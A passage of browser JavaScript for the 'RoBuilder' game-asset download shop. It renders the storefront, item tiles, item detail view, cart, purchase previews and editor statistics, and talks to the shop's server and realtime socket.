let AccountID,
    Realtime,
    ThemeColors = {
        GreenColor: "#83eaf1",
        BlueColor: "#63a4ff",
        SecColor: "#F0F0F0",
        GreyOutline: "#f7f7f7",
    },
    Font = "'Poppins', sans-serif",
    Shop = "robuilder",
    SortSections = ["Assets", "Packs", "Free"],
    SocialLinks = [
        {
            Site: "Twitter",
            Color: "#1DA1F2",
            Name: "RoBuilderYT",
            Link: "https://twitter.com/RoBuilderYT",
        },
        {
            Site: "YouTube",
            Color: "#FF0000",
            Name: "RoBuilder",
            Link: "https://www.youtube.com/@RoBuilder",
        },
        {
            Site: "Discord",
            Color: "#5865F2",
            Name: "RoBuilders",
            Link: "https://discord.gg/robuilders",
        },
    ],
    StatNames = ["Views", "Purchases", "Downloads", "Earnings"],
    FullAmount = 50,
    CurrentSort = "Assets",
    LastTimestamp = 0,
    ServerURL = "https://exotek.co/downloadshop/" + Shop + "/",
    AssetURL = "https://download-shop.s3.amazonaws.com/",
    LoggedInEmail = "",
    IsEditor = !1,
    ShoppingCart = {},
    Purchases = [],
    OpenModal = "",
    ViewingItem = null;
const socket = new SimpleSocket({
    project_id: "61d8ccadb76d47c3571c5b22",
    project_token: "client_6758d65e8db5abcd5a1948eed4e57ef33b2",
});
function RealtimeUpdate(e) {
    switch (e.Task) {
        case "NewItem":
            if (e.Item.Section == CurrentSort.toLowerCase()) {
                let t = find("ItemTileHolder");
                if (null != t) {
                    let o = createTile(t, e.Item);
                    null != t.firstChild && t.insertBefore(o, t.firstChild);
                }
            }
            break;
        case "CartAdd":
            (ShoppingCart[e.Item._id] = e.Item), (OpenModal = ""), ViewCart();
            break;
        case "CartRemove":
            delete ShoppingCart[e.ItemID], (OpenModal = ""), ViewCart();
            break;
        case "Checkout":
            ShoppingCart = {};
            let t = find("TopBarModal");
            null != t && t.remove(), PreviewBoughtItems(e.Items, "Thank You ❤");
            break;
        case "EditItem":
            let o = e.Item,
                i = o.Price || 0,
                n = "#12E497";
            if (1 == Purchases.includes(o._id))
                (i = "PURCHASED"), (n = ThemeColors.BlueColor);
            else if (0 == o.OnSale) (i = "Offsale"), (n = "#969696");
            else if (0 == i) i = "FREE";
            else {
                let e = Number(i),
                    t = String(i).split(".");
                (1 == t.length || t[1].length < 3) && (e = e.toFixed(2)), (i = "$" + e);
            }
            let r = find("ShopItemTile" + o._id);
            null != r &&
                ((r.querySelector("#ShopTileItemName").textContent = o.Name),
                    (r.querySelector("#ShopTilePrice").textContent = i),
                    (r.querySelector("#ShopTilePrice").style.color = n)),
                null != ShoppingCart[o._id] &&
                ((ShoppingCart[o._id] = o),
                    "ViewCart" == OpenModal && ((OpenModal = ""), ViewCart()));
            let l = find("ViewItemBackBlur");
            null != l && ViewingItem == o._id && (l.remove(), OpenItemView(o._id));
            break;
        case "StatChange":
            let a = Object.keys(e.Stats);
            for (let t = 0; t < a.length; t++) {
                let o = find(e._id + a[t] + "Value");
                null != o && (o.textContent = parseInt(o.textContent) + e.Stats[a[t]]);
            }
            break;
        case "Realtime":
            (Realtime = e.Token), UpdateSubscribe();
            break;
        case "Email":
            LoggedInEmail = e.Email;
    }
}
function PreviewBoughtItems(e, t) {
    OpenModal = "";
    let o = createElement("CheckoutBackBlur", "div", "body", {
        position: "fixed",
        width: "100%",
        height: "100%",
        "backdrop-filter": "blur(12px)",
        "-webkit-backdrop-filter": "blur(12px)",
        left: "0px",
        top: "0px",
        "z-index": "50",
    }),
        i = createElement("JustPurchasedFrame", "div", o, {
            position: "relative",
            width: "100%",
            "max-width": "350px",
            "max-height": "100%",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            overflow: "auto",
            "background-color": "#f7f7f7",
            "border-radius": "12px",
        }),
        n = createElement("TitleThanksHolder", "div", i, {
            display: "flex",
            "box-sizing": "border-box",
            "flex-wrap": "wrap",
            width: "100%",
            padding: "40px 8px 16px 8px",
            "justify-content": "center",
            "background-image": "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)",
            "-webkit-clip-path":
                "polygon(0 0, 100% 0, 100% 56%, 0 100%); clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%)",
        }),
        r = createElement("CloseViewB", "div", i, {
            position: "absolute",
            display: "flex",
            width: "32px",
            height: "32px",
            right: "10px",
            top: "10px",
            cursor: "pointer",
            "font-size": "60px",
            "line-height": "60px",
            "overflow-wrap": "break-word",
            "white-space": "pre-wrap",
            "font-family": Font,
            color: "#ffffff",
            "font-weight": "400",
            "justify-content": "center",
            "align-items": "center",
        });
    (r.innerHTML = "&times;"),
        (r.onmouseup = function () {
            o.remove(), CloseBlobs();
        }),
        (createElement("TitleThanksHolder", "div", n, {
            width: "100%",
            "font-size": "28px",
            "line-height": "32px",
            "font-family": Font,
            "font-weight": "600",
            color: "#ffffff",
            "text-align": "center",
        }).textContent = t);
    for (let o = 0; o < e.length; o++) {
        let n = e[o];
        Purchases.push(n._id);
        let r = createElement("PurchaseTile", "div", i, {
            position: "relative",
            "box-sizing": "border-box",
            display: "flex",
            margin: "8px",
            padding: "6px",
            "background-color": "rgba(238, 238, 238)",
            "border-radius": "12px",
            overflow: "hidden",
            "align-items": "center",
        });
        if (
            (createElement("PurchaseThumbImage", "div", r, {
                width: "36px",
                height: "36px",
                "object-fit": "cover",
                "border-radius": "6px",
                content: "url(" + AssetURL + "images/" + n._id + "_Image0)",
            }),
                (createElement("PurchaseItemName", "div", r, {
                    "margin-left": "4px",
                    "font-size": "20px",
                    "line-height": "20px",
                    "font-family": Font,
                    "font-weight": "800",
                    color: "#000000",
                    "white-space": "pre",
                }).textContent = n.Name),
                "Your Purchases" == t)
        )
            setCSS(r, "cursor", "pointer"),
                r.setAttribute("onclick", "OpenItemView('" + n._id + "')");
        else {
            let e = createElement("DownloadBoughtItemTile", "a", r, {
                position: "absolute",
                display: "flex",
                width: "26px",
                height: "100%",
                right: "0px",
                "padding-right": "6px",
                cursor: "pointer",
                "background-color": "rgb(238, 238, 238)",
                "box-shadow": "-5px 1px 5px 1px rgb(238, 238, 238)",
                content: "url(./Images/Download.svg)",
            });
            e.setAttribute("title", "Download Asset"),
                e.setAttribute(
                    "onclick",
                    "async function Run() { let [ Status, Response ] = await SendRequest('GET', 'download?item=' + '" +
                    n._id +
                    "'); if (Status == 200) { window.location = Response; } } Run();"
                );
        }
        let l = find("ShopItemTile" + n._id);
        null != l &&
            ((l.querySelector("#ShopTilePrice").textContent = "PURCHASED"),
                (l.querySelector("#ShopTilePrice").style.color = "#63a4ff"));
    }
    if (e.length < 1) {
        createElement("PurchaseTile", "div", i, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "6px",
            "font-size": "18px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "600",
            color: "#000000",
            "text-align": "center",
        }).textContent = "Nothing Yet...";
    } else {
        let e = createElement("TitleThanksHolder", "div", i, {
            display: "flex",
            "box-sizing": "border-box",
            "flex-wrap": "wrap",
            gap: "8px",
            width: "100%",
            "margin-top": "8px",
            padding: "8px",
            "background-color": "#cdcdcd",
            "justify-content": "center",
        });
        createElement("DownloadTextureImg", "img", e, {
            width: "100px",
            height: "100px",
            "border-radius": "5px",
        }).src = "./Images/ColorPallet.png";
        let t = createElement("TitleThanksHolder", "div", e, {
            display: "flex",
            "flex-wrap": "wrap",
            flex: "1 1 200px",
            "justify-content": "center",
            "align-items": "center",
        });
        createElement("DownloadTextureTitle", "div", t, {
            width: "100%",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "600",
            color: "#ffffff",
            "text-align": "center",
        }).textContent = "Don’t forget your free color pallet!";
        let o = createElement("DownloadTextureButton", "a", t, {
            "margin-top": "6px",
            padding: "6px",
            "background-image": "linear-gradient(315deg, #22F2CC 0%, #29FFB8 74%)",
            "border-radius": "6px",
            cursor: "pointer",
            "font-size": "18px",
            "line-height": "18px",
            "font-family": Font,
            "font-weight": "900",
            color: "#ffffff",
            "text-align": "center",
            "text-decoration": "none",
        });
        (o.textContent = "Download Pallet"),
            (o.href = "./Images/ColorPallet.png"),
            o.setAttribute("target", "_blank");
    }
}
let UpdateSub = null;
function UpdateSubscribe() {
    let e = { App: "downloadshop-" + Shop, Type: "update" };
    "" != LoggedInEmail && (e.Token = Realtime),
        1 == IsEditor && null != ViewingItem && (e.Item = ViewingItem),
        null == UpdateSub
            ? (UpdateSub = socket.subscribe(e, RealtimeUpdate))
            : UpdateSub.edit(e);
}
let localDataStore = {};
function setLocalStore(e, t) {
    localDataStore[e] = t;
    try {
        localStorage.setItem(e, t);
    } catch { }
}
function getLocalStore(e) {
    let t = localDataStore[e];
    try {
        t = localStorage.getItem(e);
    } catch { }
    return t;
}
function removeLocalStore(e) {
    localDataStore[e] && delete localDataStore[e];
    try {
        localStorage.removeItem(e);
    } catch { }
}
let EpochOffset = 0;
function getEpoch() {
    return Date.now() + EpochOffset;
}
function ensureLogin() {
    let e = getLocalStore("Token");
    if (null != e) return e;
}
async function renewToken() {
    let e = await fetch(ServerURL + "auth/renew", {
        method: "POST",
        headers: { cache: "no-cache", "Content-Type": "text/plain" },
        body: JSON.stringify({
            UserID: getLocalStore("UserID"),
            Refresh: JSON.parse(ensureLogin()).Refresh,
        }),
    });
    if (200 == e.status) {
        let t = JSON.parse(await e.text());
        return (
            setLocalStore("Token", JSON.stringify(t.Token)),
            (Realtime = t.Realtime),
            t.Roken
        );
    }
    removeLocalStore("UserID"), removeLocalStore("Token");
}
async function SendRequest(e, t, o, i) {
    let n = { method: e, headers: { cache: "no-cache" } };
    1 != i && (n.headers["Content-Type"] = "text/plain"),
        null != o && (n.body = o);
    let r = localStorage.getItem("Token");
    null != r &&
        ((r = JSON.parse(r)),
            r.Expires < Math.floor(getEpoch() / 1e3) && (r = (await renewToken()) || r),
            (n.headers.auth = localStorage.getItem("UserID") + ";" + r.Token));
    let l = await fetch(ServerURL + t, n);
    if (1 == l.headers.has("date")) {
        let e = new Date(l.headers.get("date")).getTime(),
            t = new Date().getTime();
        EpochOffset = e - t;
    }
    return 401 == l.status && renewToken(), [l.status, await l.text()];
}
function PullObjectField(e, t) {
    let o = {},
        i = Object.keys(e);
    for (let n = 0; n < i.length; n++) {
        let r = e[i[n]];
        o[r[t]] = r;
    }
    return o;
}
async function CheckForAlreadySignIn() {
    if (null != localStorage.getItem("Token")) {
        let [e, t] = await SendRequest("GET", "accountdetails");
        200 == e &&
            ((t = JSON.parse(t)),
                (AccountID = t.Account),
                (LoggedInEmail = t.Email),
                (Realtime = t.Realtime),
                null != t.Cart && (ShoppingCart = PullObjectField(t.Cart, "_id")),
                null != t.Purchases && (Purchases = t.Purchases),
                1 == t.IsEditor && (IsEditor = !0),
                setCSS(ShoppingCartB, "display", "block"));
    }
    UpdateSubscribe();
    let e = window.location.search,
        t = new URLSearchParams(e).get("asset");
    null != t && OpenItemView(t), LoadTiles();
}
let BackgroundBackdrop = createElement("BackgroundBackdrop", "div", "body", {
    position: "absolute",
    width: "100%",
    height: "499px",
    top: "0px",
    "object-fit": "cover",
    content: "url('../Images/Background.png')",
    "-webkit-clip-path":
        "polygon(0 0, 100% 0, 100% 56%, 0 100%); clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%)",
}),
    BannerBackdrop = createElement("BannerBackdrop", "div", "body", {
        position: "absolute",
        width: "100%",
        height: "500px",
        top: "0px",
        "object-fit": "cover",
        "object-position": "center top",
        "background-color": "#63a4ff",
        opacity: "0.85",
        "backdrop-filter": "blur(2px)",
        "background-image": "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)",
        "-webkit-clip-path":
            "polygon(0 0, 100% 0, 100% 56%, 0 100%); clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%)",
    }),
    CoreApp = createElement("CoreApp", "div", "body", {
        position: "absolute",
        "box-sizing": "border-box",
        width: "1100px",
        "max-width": "100%",
        "min-height": "calc(100% - 36px)",
        top: "36px",
        left: "50%",
        "padding-bottom": "36px",
        transform: "translateX(-50%)",
    }),
    SiteHeaderHolder = createElement("SiteHeaderHolder", "div", CoreApp, {
        display: "flex",
        "box-sizing": "border-box",
        "flex-wrap": "wrap",
        width: "100%",
        height: "fit-content",
        padding: "8px",
        "align-items": "center",
    }),
    RoBuilderImgHolder = createElement(
        "RoBuilderImgHolder",
        "div",
        SiteHeaderHolder,
        {
            flex: "1 1 300px",
            "max-width": "min(460px, 40vw)",
            "max-height": "550px",
        }
    ),
    RoBuilderImg = createElement("RoBuilderImg", "img", RoBuilderImgHolder, {
        "object-fit": "scale-down",
        width: "100%",
        height: "100%",
    });
RoBuilderImg.src = "./Images/RoBuilderClassic.png";
let StartContentHolder = createElement(
    "StartContentHolder",
    "div",
    SiteHeaderHolder,
    { flex: "1 1 300px", "min-height": "400px" }
),
    RoBuildTitle = createElement("RoBuildTitle", "div", StartContentHolder, {
        transform: "rotate(2deg)",
        "font-size": "clamp(24px, 60px, 16vw)",
        "line-height": "calc(clamp(24px, 60px, 16vw) + 10px)",
        "font-family": Font,
        "font-weight": "900",
        color: "#ffffff",
    });
RoBuildTitle.innerHTML =
    "Hey, I'm <span style='color: #3B96FF; -webkit-text-stroke: 2px #2868B0'>RoBuilder!</span>";
let RoBuildDesc = createElement("RoBuildDesc", "div", StartContentHolder, {
    "margin-top": "18px",
    "font-size": "22px",
    "line-height": "28px",
    "font-family": Font,
    "font-weight": "600",
});
RoBuildDesc.textContent =
    "Take a look at my collection of assets for use in your games!";
let SocialLinkHolder = createElement(
    "SocialLinkHolder",
    "div",
    StartContentHolder,
    {
        display: "flex",
        "flex-wrap": "wrap",
        width: "calc(100% - 16px)",
        margin: "24px 0px 0px 8px",
    }
);
for (let e = 0; e < SocialLinks.length; e++) {
    let t = SocialLinks[e],
        o = createElement("NewSocialLink" + t.Name, "a", SocialLinkHolder, {
            display: "flex",
            width: "fit-content",
            padding: "4px",
            margin: "4px",
            background: "#fff",
            "border-radius": "20px",
            "text-decoration": "none",
            "align-items": "center",
        });
    null != t.Link
        ? (o.setAttribute("href", t.Link),
            o.setAttribute("target", "_blank"),
            o.setAttribute("title", t.Link),
            setCSS(o, "cursor", "pointer"))
        : o.setAttribute("title", t.Name),
        createElement("SocialCompanyIcon", "div", o, {
            width: "28px",
            height: "28px",
            padding: "3px",
            background: t.Color,
            "border-radius": "17px",
            content: "url(../Images/SocialLinks/" + t.Site + ".svg)",
        }),
        (createElement("SocialLinkTx", "div", o, {
            margin: "0px 8px",
            "font-size": "18px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "500",
            color: "#000",
        }).textContent = t.Name);
}
function ResponsiveBackdrop() {
    let e = SocialLinkHolder.getBoundingClientRect(),
        t = e.y + window.scrollY + e.height + 75;
    setCSS(BackgroundBackdrop, "height", "max(500px, " + t + "px)"),
        setCSS(BannerBackdrop, "height", "max(500px, " + t + "px)");
}
window.addEventListener("resize", ResponsiveBackdrop),
    RoBuilderImg.addEventListener("load", ResponsiveBackdrop),
    ResponsiveBackdrop();
let PageTopBar = createElement("PageTopBar", "div", CoreApp, {
    position: "sticky",
    display: "flex",
    "flex-wrap": "wrap",
    width: "100%)",
    top: "0px",
    "align-items": "center",
    "margin-top": "16px",
    "z-index": "35",
    "background-color": "rgba(256, 256, 256, 0.8)",
    "backdrop-filter": "blur(10px)",
    "-webkit-backdrop-filter": "blur(10px)",
}),
    SortBHolder = createElement("SortBHolder", "div", PageTopBar, {
        display: "flex",
        "flex-wrap": "wrap",
    });
for (let e = 0; e < SortSections.length; e++) {
    let t = SortSections[e],
        o = createElement("SortButton_" + t, "div", SortBHolder, {
            height: "min-content",
            margin: "8px",
            padding: "6px",
            "border-radius": "6px",
            cursor: "pointer",
            "font-size": "20px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "700",
            color: "#000000",
            "text-align": "center",
            "justify-content": "center",
            "align-items": "center",
        });
    (o.textContent = t), o.setAttribute("onmouseup", "SortButtonClick(this)");
}
let AccountDetailsHolder = createElement(
    "AccountDetailsHolder",
    "div",
    PageTopBar,
    {
        display: "flex",
        "flex-wrap": "wrap",
        "margin-left": "auto",
        padding: "3px",
    }
),
    ShoppingCartB = createElement("ShoppingCartB", "div", AccountDetailsHolder, {
        width: "36px",
        height: "36px",
        "margin-right": "6px",
        cursor: "pointer",
        display: "none",
    });
(ShoppingCartB.innerHTML =
    '<svg viewBox="0 0 256 256" fill="none" xmlns="http://www.w3.org/2000/svg"> <mask id="path-1-inside-1_304_2" fill="white"> <rect x="6" y="112" width="244" height="144" rx="17"/> </mask> <rect x="6" y="112" width="244" height="144" rx="17" stroke="black" stroke-width="40" mask="url(#path-1-inside-1_304_2)"/> <path d="M54 122L93 51" stroke="black" stroke-width="20" stroke-linecap="round"/> <path d="M202 122L163 51" stroke="black" stroke-width="20" stroke-linecap="round"/> <path d="M59 215V152" stroke="black" stroke-width="20" stroke-linecap="round"/> <path d="M105 215V153" stroke="black" stroke-width="20" stroke-linecap="round"/> <path d="M152 216V153" stroke="black" stroke-width="20" stroke-linecap="round"/> <path d="M198 216V154" stroke="black" stroke-width="20" stroke-linecap="round"/> </svg>'),
    ShoppingCartB.addEventListener("mouseup", ViewCart),
    ShoppingCartB.setAttribute("title", "Cart");
let AccountB = createElement("AccountB", "div", AccountDetailsHolder, {
    width: "36px",
    height: "36px",
    "margin-right": "3px",
    cursor: "pointer",
});
function SortButtonClick(e) {
    let t = e.id.replace(/SortButton\_/g, "");
    if (t == CurrentSort) ScrollToPageStart();
    else {
        removeCSS("SortButton_" + CurrentSort, "background-image"),
            setCSS("SortButton_" + CurrentSort, "color", "#000000"),
            (CurrentSort = t);
        let e = find("SortButton_" + t);
        setCSS(
            e,
            "background-image",
            "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)"
        ),
            setCSS(e, "color", "#ffffff"),
            ScrollToPageStart();
        let o = find("ItemTileHolder");
        null != o && o.remove(), LoadTiles();
    }
}
function ScrollToPageStart() {
    let e = SiteHeaderHolder.getBoundingClientRect();
    window.scrollTo({ top: e.height + 52, behavior: "smooth" });
}
function createTile(e, t) {
    let o = createElement("ShopItemTile" + t._id, "a", e, {
        margin: "6px",
        flex: "1 1 300px",
        "max-width": "235px",
        "background-color": "rgba(246, 246, 246)",
        "border-radius": "8px",
        overflow: "hidden",
        cursor: "pointer",
    });
    o.setAttribute("ItemID", t._id);
    let i = createElement("ShopTileThumbImageHolder", "div", o, {
        display: "flex",
        width: "100%",
        height: "170px",
        overflow: "hidden",
        "justify-content": "center",
        "align-items": "center",
    });
    createElement("ShopTileThumbImage", "div", i, {
        width: "100%",
        height: "100%",
        "object-fit": "cover",
        transition: "all .15s ease",
        content: "url(" + AssetURL + "images/" + t._id + "_Image0)",
    }),
        (createElement("ShopTileItemName", "div", o, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px 8px 6px 8px",
            "font-size": "20px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "800",
            color: "#000000",
        }).textContent = t.Name);
    let n = t.Price || 0,
        r = "#12E497";
    if (1 == Purchases.includes(t._id))
        (n = "PURCHASED"), (r = ThemeColors.BlueColor);
    else if (0 == t.OnSale) (n = "Offsale"), (r = "#969696");
    else if (0 == n) n = "FREE";
    else {
        let e = Number(n),
            t = String(n).split(".");
        (1 == t.length || t[1].length < 3) && (e = e.toFixed(2)), (n = "$" + e);
    }
    return (
        (createElement("ShopTilePrice", "div", o, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "0px 12px 8px 12px",
            "font-size": "17px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "600",
            color: r,
        }).textContent = n),
        o.setAttribute("onmouseup", "OpenItemView(this.getAttribute('ItemID'))"),
        o.setAttribute(
            "onmouseover",
            "ImageZoomIn(this.querySelector('#ShopTileThumbImageHolder').querySelector('#ShopTileThumbImage'))"
        ),
        o.setAttribute(
            "onmouseout",
            "ImageZoomOut(this.querySelector('#ShopTileThumbImageHolder').querySelector('#ShopTileThumbImage'))"
        ),
        o.setAttribute("scrollanim", ""),
        o
    );
}
(AccountB.innerHTML =
    '<svg viewBox="0 0 256 256" fill="none" xmlns="http://www.w3.org/2000/svg"> <g clip-path="url(#clip0_102:25)"> <path d="M242 260C242 272.368 232.248 285.987 211.038 297.105C190.3 307.976 160.958 315 128 315C95.0417 315 65.6996 307.976 44.9615 297.105C23.7515 285.987 14 272.368 14 260C14 247.632 23.7515 234.013 44.9615 222.895C65.6996 212.024 95.0417 205 128 205C160.958 205 190.3 212.024 211.038 222.895C232.248 234.013 242 247.632 242 260Z" stroke="#000000" stroke-width="20"/> <circle cx="128" cy="105" r="63" stroke="#000000" stroke-width="20"/> </g> <defs> <clipPath id="clip0_102:25"> <rect width="256" height="256"/> </clipPath> </defs> </svg>'),
    AccountB.addEventListener("mouseup", ShopSignInUp),
    AccountB.setAttribute("title", "Account"),
    setCSS(
        "SortButton_" + CurrentSort,
        "background-image",
        "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)"
    ),
    setCSS("SortButton_" + CurrentSort, "color", "#ffffff");
let ItemTileHolder = null,
    LoadMoreTiles = createElement("LoadMoreTiles", "div", CoreApp, {
        display: "none",
        "justify-content": "center",
    }),
    LoadMoreTilesButton = createElement(
        "LoadMoreTilesButton",
        "div",
        LoadMoreTiles,
        {
            width: "fit-content",
            "box-sizing": "border-box",
            margin: "16px 0px 16px 0px",
            padding: "8px",
            "border-radius": "8px",
            "background-image": "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)",
            cursor: "pointer",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "700",
            color: "#ffffff",
        }
    );
async function LoadTiles() {
    (ItemTileHolder = createElement("ItemTileHolder", "div", CoreApp, {
        display: "flex",
        "flex-wrap": "wrap",
        "box-sizing": "border-box",
        "margin-bottom": "3px",
        "justify-content": "center",
    })),
        CoreApp.insertBefore(ItemTileHolder, LoadMoreTiles);
    let e = CurrentSort,
        [t, o] = await SendRequest("GET", "items?sort=" + CurrentSort);
    if (200 == t) {
        if (e != CurrentSort) return;
        let t = JSON.parse(o);
        for (let e = 0; e < t.length; e++) createTile(ItemTileHolder, t[e]);
        t.length > 0 &&
            ((LastTimestamp = t[t.length - 1].Timestamp),
                t.length > FullAmount - 1 && setCSS(LoadMoreTiles, "display", "flex"));
    }
    SmoothScrollAnim();
}
function ImageZoomIn(e) {
    e.style.transform = "scale(1.15)";
}
function ImageZoomOut(e) {
    e.style.transform = "";
}
function URLParams(e, t) {
    const o = new URL(window.location);
    null != t ? o.searchParams.set(e, t) : o.searchParams.delete(e),
        window.history.pushState({}, "", o);
}
async function OpenItemView(e) {
    let t = createElement("ViewItemBackBlur", "div", "body", {
        position: "fixed",
        width: "100%",
        height: "100%",
        "backdrop-filter": "blur(12px)",
        "-webkit-backdrop-filter": "blur(12px)",
        left: "0px",
        top: "0px",
        "z-index": "50",
    }),
        o = createElement("ItemViewFrame", "div", t, {
            position: "relative",
            opacity: "0",
            width: "100%",
            "max-width": "800px",
            "max-height": "100%",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            transition: "all .15s ease",
            overflow: "auto",
            "background-color": "#f7f7f7",
            "border-radius": "12px",
        }),
        i = !1;
    ViewingItem != e && ((ViewingItem = e), (i = !0));
    let [n, r] = await SendRequest("GET", "details?item=" + e);
    if (200 != n) return t.remove(), void URLParams("asset");
    let l = JSON.parse(r),
        a = l.Stats || {};
    i && ((ViewingItem = e), UpdateSubscribe(), (a.Views = (a.Views || 0) + 1)),
        URLParams("asset", e),
        (o.style.opacity = 1);
    let p = createElement("CloseViewB", "div", o, {
        position: "absolute",
        display: "flex",
        width: "32px",
        height: "32px",
        right: "10px",
        top: "10px",
        cursor: "pointer",
        "font-size": "60px",
        "line-height": "60px",
        "overflow-wrap": "break-word",
        "white-space": "pre-wrap",
        "font-family": Font,
        "font-weight": "400",
        "justify-content": "center",
        "align-items": "center",
    });
    (p.innerHTML = "&times;"),
        (p.onmouseup = function () {
            t.remove(), URLParams("asset");
        }),
        (t.onmouseup = function (e) {
            e.target == t && (t.remove(), URLParams("asset"));
        });
    let s = createElement("ItemDetailsHolder", "div", o, {
        display: "flex",
        "box-sizing": "border-box",
        "flex-wrap": "wrap",
        width: "100%",
        padding: "50px 8px 2px 8px",
    }),
        d = createElement("ImagePrevHolder", "div", s, { flex: "1 1 200px" }),
        c = createElement("CurrentlyViewingImage", "img", d, {
            width: "100%",
            height: "350px",
            "object-fit": "cover",
            "border-radius": "8px",
            transition: "all .1s ease",
        });
    c.src = AssetURL + "images/" + l._id + "_Image0";
    let f = createElement("ImageHighlightWheel", "div", d, {
        display: "flex",
        "flex-wrap": "wrap",
        width: "100%",
        "margin-top": "2px",
        gap: "6px",
        "justify-content": "center",
    });
    if (l.Images > 1)
        for (let e = 0; e < l.Images; e++) {
            let t = createElement("OtherImageSelect", "img", f, {
                width: "50px",
                height: "50px",
                "object-fit": "cover",
                "border-radius": "6px",
                "margin-bottom": "5px",
                cursor: "pointer",
            });
            (t.src = AssetURL + "images/" + l._id + "_Image" + e),
                t.addEventListener("mouseup", async function (e) {
                    (c.style.opacity = 0),
                        await sleep(125),
                        (c.src = e.target.src),
                        (c.style.opacity = 1);
                });
        }
    let g = createElement("DetailsHolder", "div", s, { flex: "1 1 200px" });
    (createElement("ShopItemName", "div", g, {
        "box-sizing": "border-box",
        width: "100%",
        padding: "8px",
        "font-size": "36px",
        "line-height": "42px",
        "font-family": Font,
        "font-weight": "800",
        color: "#000000",
        "overflow-wrap": "anywhere",
    }).textContent = l.Name),
        null != l.Type &&
        (createElement("ShopItemType", "div", g, {
            "box-sizing": "border-box",
            width: "100%",
            "padding-left": "8px",
            "font-size": "18px",
            "line-height": "22px",
            "font-family": Font,
            "font-weight": "600",
            color: "#000000",
        }).innerText = l.Type),
        null != l.FileType &&
        (createElement("ShopFileType", "div", g, {
            "box-sizing": "border-box",
            width: "100%",
            "padding-left": "8px",
            "margin-top": "6px",
            "font-size": "18px",
            "line-height": "22px",
            "font-family": Font,
            "font-weight": "600",
            color: "#000000",
        }).innerHTML =
            "Downloads as <span style='color: " +
            ThemeColors.BlueColor +
            "'>." +
            l.FileType +
            "</span>");
    let x = createElement("ShopTilePrice", "div", g, {
        display: "flex",
        "flex-wrap": "wrap",
        margin: "8px 12px 0px 12px",
        "align-items": "center",
    }),
        h = "Offsale",
        u = "#969696";
    if (0 != l.OnSale)
        if (((u = "#12E497"), (h = l.Price || 0), 0 == h)) h = "FREE";
        else {
            let e = Number(h),
                t = String(h).split(".");
            (1 == t.length || t[1].length < 3) && (e = e.toFixed(2)), (h = "$" + e);
        }
    createElement("ShopItemPrice", "div", x, {
        "box-sizing": "border-box",
        margin: "0px 8px 8px 0px",
        "font-size": "22px",
        "line-height": "26px",
        "font-family": Font,
        "font-weight": "600",
        color: u,
    }).textContent = h;
    let m = createElement("AddToCartB", "div", x, {
        margin: "0px 8px 8px 0px",
        padding: "6px",
        "border-radius": "6px",
        cursor: "pointer",
        "font-size": "20px",
        "line-height": "20px",
        "font-family": Font,
        "font-weight": "900",
        color: "#ffffff",
    });
    function b() {
        if (1 == Purchases.includes(e))
            return (
                (m.textContent = "Download"),
                void setCSS(
                    m,
                    "background-image",
                    "linear-gradient(315deg, #26FFDB 0%, #26FFB3 74%)"
                )
            );
        null == ShoppingCart[e]
            ? (0 == l.OnSale && setCSS(m, "display", "none"),
                (m.textContent = "Add to Cart"),
                setCSS(
                    m,
                    "background-image",
                    "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)"
                ))
            : ((m.textContent = "Remove from Cart"),
                setCSS(
                    m,
                    "background-image",
                    "linear-gradient(315deg, #FF3126 0%, #FF4E26 74%)"
                ));
    }
    if (
        (m.addEventListener("mouseup", async function () {
            if ((t.remove(), 1 != Purchases.includes(e)))
                (OpenModal = ""),
                    "" != LoggedInEmail
                        ? (null == ShoppingCart[e]
                            ? ((ShoppingCart[e] = l),
                                SendRequest("PATCH", "cart?item=" + e))
                            : (delete ShoppingCart[e],
                                SendRequest("DELETE", "cart?item=" + e)),
                            b(),
                            ViewCart())
                        : ShopSignInUp();
            else {
                let [t, o] = await SendRequest("GET", "download?item=" + e);
                200 == t && (window.location = o);
            }
        }),
            b(),
            1 == IsEditor)
    ) {
        let e = createElement("EditAssetB", "div", x, {
            "margin-bottom": "8px",
            padding: "6px",
            "border-radius": "6px",
            cursor: "pointer",
            "background-color": "#969696",
            "font-size": "20px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "900",
            color: "#ffffff",
        });
        (e.textContent = "Edit"),
            e.addEventListener("mouseup", async function () {
                t.remove(), LoadCreateItem(l);
            });
    }
    if (
        (null != l.Desc &&
            (createElement("ShopItemDesc", "div", g, {
                "box-sizing": "border-box",
                width: "100%",
                padding: "8px",
                "font-size": "14px",
                "line-height": "16px",
                "font-family": Font,
                "font-weight": "400",
                color: "#000000",
                "overflow-wrap": "anywhere",
            }).innerText = l.Desc),
            1 == IsEditor)
    ) {
        let e = createElement("AnalyticsHolder", "div", g, {
            display: "flex",
            "flex-wrap": "wrap",
            margin: "8px 8px 8px 8px",
            "align-items": "center",
        });
        for (let t = 0; t < StatNames.length; t++) {
            let o = StatNames[t],
                i = a[o] || 0,
                n = createElement(o + "StatHolder", "div", e, {
                    display: "flex",
                    padding: "8px",
                    "align-items": "baseline",
                });
            if ("Earnings" == o) {
                (createElement(l._id + "DollarSign", "div", n, {
                    "font-size": "20px",
                    "line-height": "24px",
                    "font-family": Font,
                    "font-weight": "600",
                    color: "#000000",
                    "overflow-wrap": "anywhere",
                }).textContent = "$"),
                    (i = Number(i));
                let e = String(i).split(".");
                (1 == e.length || e[1].length < 3) && (i = i.toFixed(2));
            }
